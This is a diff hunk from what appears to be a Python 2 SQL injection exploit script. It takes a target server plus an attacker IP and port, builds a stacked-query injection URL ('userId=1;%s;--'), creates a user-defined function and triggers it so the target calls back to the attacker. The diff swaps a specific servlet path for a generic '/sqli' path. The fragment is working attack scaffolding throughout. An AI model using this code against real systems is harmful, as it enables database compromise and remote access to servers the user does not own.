@@ -33,6 +33,6 @@ if __name__ == '__main__':
         print "[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0] 
         sys.exit()
 
-    sqli_url = "https://"+server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--"
+    sqli_url = "https://"+server+"/sqli?Range=1&userId=1;%s;--"
     create_udf_func(sqli_url) 
     trigger_udf(sqli_url, attacker, port)
